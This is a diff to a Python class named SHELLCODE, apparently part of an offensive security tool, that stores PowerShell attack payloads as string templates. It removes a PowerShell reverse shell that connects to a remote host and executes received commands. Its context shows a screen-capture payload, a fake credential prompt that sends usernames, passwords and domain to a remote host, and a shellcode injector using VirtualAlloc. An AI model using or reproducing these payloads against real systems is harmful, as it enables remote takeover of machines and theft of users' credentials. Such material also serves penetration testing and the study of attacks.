@@ -165,17 +165,6 @@ class SHELLCODE(object):
         "$sendbyte = ([text.encoding]::ASCII).GetBytes($backres);$stream.Write($sendbyte,0,$sendbyte.Length);"
         "$stream.Flush()};$client.Close();if ($listener){$listener.Stop()}")
 
-    windows_ps_rev_shell = (
-        "$client = New-Object System.Net.Sockets.TCPClient('%s','%s');"
-        "$stream = $client.GetStream(); [byte[]]$bytes = 0..65535%s;"
-        "$sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>');"
-        "$stream.Write($sendbytes,0,$sendbytes.Length); while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)"
-        "{$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding; $data = $EncodedText.GetString($bytes,0, $i);"
-        "try{$commandback = (Invoke-Expression -Command $data 2>&1 | Out-String )}catch{Write-Warning \"Error on Target\"};"
-        "$backres  = $commandback + 'PS ' + (Get-Location).Path + '> ';$x = ($error[0] | Out-String);$error.clear();"
-        "$backres = $backres + $x;$sendbyte = ([text.encoding]::ASCII).GetBytes($backres);$stream.Write($sendbyte,0,$sendbyte.Length);"
-        "$stream.Flush()};$client.Close();if ($listener){$listener.Stop()}")
-
     windows_ps_rev_watch_screen = (
         "while ($true){try{Add-Type -AssemblyName System.Windows.Forms;"
         "[System.IO.MemoryStream];$MemoryStream = New-Object System.IO.MemoryStream;"
@@ -203,7 +192,7 @@ class SHELLCODE(object):
         "if(($authlocal -eq $true) -or ($authdomain.name -ne $null)){$output = \"Username: \" + $user + \" Password: \" + $pass + \" Domain:\" + $domain + \" Domain:\"+ $authdomain.name8;"
         "$client = New-Object System.Net.Sockets.TCPClient('%s','%s');$stream = $client.GetStream();"
         "$send = ([text.encoding]::ASCII).GetBytes('='*30 + $output + '='*30);"
-        "$stream.Write($send,0,$send.Length);$client.Close();break}}}")
+        "$stream.Write($send,0,$send.Length);Exit}}}")
 
     injectwindows = """shellcode = bytearray('%s')
 ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
